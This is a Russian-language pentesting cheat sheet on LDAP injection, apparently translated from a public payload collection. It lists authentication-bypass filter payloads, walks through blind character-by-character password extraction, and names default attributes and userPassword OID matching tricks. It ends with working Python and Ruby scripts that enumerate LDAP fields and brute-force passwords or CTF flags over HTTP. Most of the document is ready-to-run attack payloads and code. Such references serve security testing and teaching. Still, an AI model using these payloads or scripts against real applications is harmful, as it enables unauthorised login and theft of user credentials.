> LDAP-инъекция — это атака, направленная на эксплуатацию веб-приложений, которые формируют LDAP-запросы на основе пользовательского ввода. Если приложение не выполняет должную санитацию входных данных, появляется возможность модифицировать LDAP-запросы с помощью локального прокси.

* [Методология](#Методология)
  * [Обход аутентификации (Authentication Bypass)](#Обход-аутентификации-Authentication-Bypass)
  * [Слепая эксплуатация (Blind Exploitation)](#Слепая-эксплуатация-Blind-Exploitation)
* [Атрибуты по умолчанию (Defaults Attributes)](#Атрибуты-по-умолчанию-Defaults-Attributes)
* [Эксплуатация атрибута userPassword (Exploiting userPassword Attribute)](#Эксплуатация-атрибута-userPassword-Exploiting-userPassword-Attribute)
* [Скрипты (Scripts)](#Скрипты-Scripts)
  * [Обнаружение валидных LDAP-полей (Discover Valid LDAP Fields)](#Обнаружение-валидных-LDAP-полей-Discover-Valid-LDAP-Fields)
  * [Специальная слепая LDAP-инъекция (Special Blind LDAP Injection)](#Специальная-слепая-LDAP-инъекция-Special-Blind-LDAP-Injection)  

# Методология
> **LDAP(Lightweight Directory Access Protocol)** - Используется для доступа к информации в каталогах пользователей и учётных записей. Например, пользователи могут использовать одни и те же учётные данные для доступа к различным приложениям в организации.
>
> **LDAP-инъекция** — это уязвимость, возникающая, когда пользовательский ввод используется для построения LDAP-запросов без должной санитации или экранирования.

## Обход аутентификации (Authentication Bypass)

Попытка манипулировать логикой фильтра путем внедрения условий, которые всегда истинны.

**Пример 1:** Этот LDAP-запрос использует логические операторы в структуре запроса для потенциального обхода аутентификации.
```python
user  = *)(uid=*))(|(uid=*
pass  = password
query = (&(uid=*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))
```
**Пример 2:** Этот LDAP-запрос использует логические операторы в структуре запроса для потенциального обхода аутентификации.
```python
user  = admin)(!(&(1=0
pass  = q))
query = (&(uid=admin)(!(&(1=0)(userPassword=q))))
```
## Слепая эксплуатация (Blind Exploitation)

Этот сценарий демонстрирует слепую эксплуатацию LDAP с использованием техники, аналогичной бинарному поиску или перебору по символам, для обнаружения конфиденциальной информации, такой как пароли. Метод основан на том, что LDAP-фильтры по-разному реагируют на запросы в зависимости от соответствия условий, не раскрывая напрямую сам пароль.
```python
(&(sn=administrator)(password=*))    : OK
(&(sn=administrator)(password=A*))   : KO
(&(sn=administrator)(password=B*))   : KO
...
(&(sn=administrator)(password=M*))   : OK
(&(sn=administrator)(password=MA*))  : KO
(&(sn=administrator)(password=MB*))  : KO
...
(&(sn=administrator)(password=MY*))  : OK
(&(sn=administrator)(password=MYA*)) : KO
(&(sn=administrator)(password=MYB*)) : KO
(&(sn=administrator)(password=MYC*)) : KO
...
(&(sn=administrator)(password=MYK*)) : OK
(&(sn=administrator)(password=MYKE)) : OK
```
**Разбор LDAP-фильтра:**

* &: Логический оператор И (AND), означающий, что все внутренние условия должны быть истинными.
* (sn=administrator): Соответствует записям, где атрибут sn (surname, фамилия) равен administrator.
* (password=X*): Соответствует записям, где пароль начинается с X (с учетом регистра). Звездочка (*) — это подстановочный знак, представляющий любые оставшиеся символы.

# Атрибуты по умолчанию (Defaults Attributes)

Могут быть использованы в инъекции, например: *)(АТРИБУТ_ЗДЕСЬ=*
text

userPassword
surname
name
cn
sn
objectClass
mail
givenName
commonName

Эксплуатация атрибута userPassword (Exploiting userPassword Attribute)

Атрибут userPassword — это не строка, как, например, атрибут cn, а OCTET STRING (октетная строка). В LDAP каждый объект, тип, оператор и т.д. ссылаются на OID: octetStringOrderingMatch (OID 2.5.13.18).

    octetStringOrderingMatch (OID 2.5.13.18): Правило сопоставления порядка, которое выполняет побитовое сравнение (в порядке big endian) двух значений октетных строк до обнаружения различия. В первом случае, когда в одном значении найден нулевой бит, а в другом — единичный, значение с нулевым битом будет считаться меньшим, чем значение с единичным битом.

text

userPassword:2.5.13.18:=\xx (где \xx — байт)
userPassword:2.5.13.18:=\xx\xx
userPassword:2.5.13.18:=\xx\xx\xx

Скрипты (Scripts)

Обнаружение валидных LDAP-полей (Discover Valid LDAP Fields)
python

#!/usr/bin/python3
import requests
import string

fields = []
url = 'https://URL.com/'
f = open('dic', 'r')
world = f.read().split('\n')
f.close()

for i in world:
    r = requests.post(url, data = {'login':'*)('+str(i)+'=*))\x00', 'password':'bla'}) # Например: (&(login=*)(ITER_VAL=*))\x00)(password=bla))
    if 'TRUE CONDITION' in r.text:
        fields.append(str(i))

print(fields)

Специальная слепая LDAP-инъекция (Special Blind LDAP Injection)
python

#!/usr/bin/python3
import requests, string
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

flag = ""
for i in range(50):
    print("[i] Looking for number " + str(i))
    for char in alphabet:
        r = requests.get("http://ctf.web?action=dir&search=admin*)(password=" + flag + char)
        if ("TRUE CONDITION" in r.text):
            flag += char
            print("[+] Flag: " + flag)
            break

Скрипт для эксплуатации от @noraj
ruby

#!/usr/bin/env ruby
require 'net/http'
alphabet = [*'a'..'z', *'A'..'Z', *'0'..'9'] + '_@{}-/()!"$%=^[]:;'.split('')

flag = ''
(0..50).each do |i|
  puts("[i] Looking for number #{i}")
  alphabet.each do |char|
    r = Net::HTTP.get(URI("http://ctf.web?action=dir&search=admin*)(password=#{flag}#{char}"))
    if /TRUE CONDITION/.match?(r)
      flag += char
      puts("[+] Flag: #{flag}")
      break
    end
  end
end

Лабораторные работы (Labs)
